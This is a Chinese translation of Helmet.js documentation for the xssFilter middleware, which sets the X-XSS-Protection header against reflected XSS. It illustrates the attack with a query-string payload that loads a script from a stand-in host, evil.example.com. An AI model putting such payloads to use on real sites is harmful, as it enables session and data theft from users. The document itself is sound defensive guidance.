---
title: xssFilter
---

# xssFilter <Badge text='默认启用' />

[原文链接](https://helmetjs.github.io/docs/xss-filter/)

简介：`xssFilter`中间件设置了`X-XSS-Protection`报头来阻止反射性XSS攻击。

## 攻击方式

跨站脚本攻击(XSS，Cross-site scripting)是能够让攻击者接管页面的一种攻击方式。XSS攻击的目标是获得对受害者浏览器中JavaScript的控制。一旦黑客得手，他们就能做很多无下限的事情：记录你的行为、冒充你、窃取你的认证cookie等等。

XSS是一个千面兽，篇幅所限我们不会介绍所有内容。把握重点：如果有人能在你的页面上运行JavaScript，那么他们就能够攻击你的用户。我们必须采取措施。

其中一种XSS名为“反射性XSS”。通常，它通过设置一个直接放入HTML的查询字符串来搞事情。在查询字符串中放入JavaScript可以让攻击者通过给用户发送恶意字符串来执行它们的JavaScript。

举个例子，我们假设您运行了一个名为Goober的搜索引擎。每次进行搜索时，它都会在搜索结果的正上方显示搜索关键词。比方说我们搜索了"javascript jokes"。

页面可能像下面这样：

![image](/helmet-docs-zh-CN/images/xss-filter-ok.png)

那么如果我们搜索的是`<script src="http://evil.example.com/steal-data.js"></script>`会发生什么情况呢？URL可能会显示成下面这样：

```bash
https://goober.example.com/search?query=<script%20src="http://evil.example.com/steal-data.js"></script>
```

然后你的页面会出现什么呢：

![image](/helmet-docs-zh-CN/images/xss-filter-malicious.png)

瞧，恶意JavaScript文件就这样执行了，就很烦。

扩展阅读

- [Guide to understanding XSS](http://www.securesolutions.no/xss-explained/)
- [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/XSS)
- [What is Reflected XSS?](http://security.stackexchange.com/q/65142)
- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)

## 报头详解

首先需要明确的是:这个报头并不能很好地保护您免受XSS攻击。它仅是其中一种特殊的XSS的防范措施。它提供了一个开箱即用的基本保护，但是这个报头并不能把你从XSS攻击中拯救出来。

浏览器很容易检测到简单的反射性XSS。在上面的示例中，如果\<script\>标签与查询字符串中的内容匹配，浏览器可以选择不执行其中的JavaScript。有些浏览器默认情况下会进行这种检测，但有些则不会。要使这些浏览器也检查这个情况，您可以设置`X-XSS-Protection`报头值为`1`;`mode=block`。

这就会告诉浏览器检测并屏蔽反射性XSS。

在旧版本的IE浏览器中，这个报头会导致更糟糕的安全漏洞，因此禁用它很明智。

扩展阅读：

- [“Controlling the XSS Filter” on MSDN](http://blogs.msdn.com/b/ieinternals/archive/2011/01/31/controlling-the-internet-explorer-xss-filter-with-the-x-xss-protection-http-header.aspx)
- [“IE’s XSS Filter Creates XSS Vulnerabilities”](http://hackademix.net/2009/11/21/ies-xss-filter-creates-xss-vulnerabilities/)
- [“XSS Filter Script Handling Vulnerability - CVE-2009-4074”](https://technet.microsoft.com/library/security/ms10-002#XSS%20Filter%20Script%20Handling%20Vulnerability%20-%20CVE-2009-4074)

## 代码

Helmet的`xssFilter`中间件很简单，它仅仅设置了`X-XSS-Protection`报头。在大多数浏览器中它会被设置为`1; mode=block`。但在旧版本的IE浏览器中，它会被设置成`0`以禁用。

您可以作为Helmet模块的内部方法来使用：

```js
// Make sure you run "npm install helmet" to get the Helmet package.
const helmet = require('helmet')

// Sets "X-XSS-Protection: 1; mode=block".
app.use(helmet.xssFilter())
```

也可以单独使用：

```js
// Make sure you run "npm install x-xss-protection" to get this package.
const xssFilter = require('x-xss-protection')

// Sets "X-XSS-Protection: 1; mode=block".
app.use(xssFilter())
```

若要在所有版本的IE浏览器中也设置成`1; mode=block`，那么：

```js
// 警告⚠️ 这样在老版本IE浏览器会产生安全隐患
app.use(xssFilter({ setOnOldIE: true }))
```

您还可以配置一个上报URI，浏览器会将违规行为进行上报。[尽管只有Chrome浏览器支持](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection)。

```js
app.use(xssFilter({ reportUri: '/report-xss-violation' }))
```

若想移除`mode=block`, **我们不推荐这么做**，则将`mode`设置为`null`:

```js
app.use(xssFilter({ mode: null }))
```

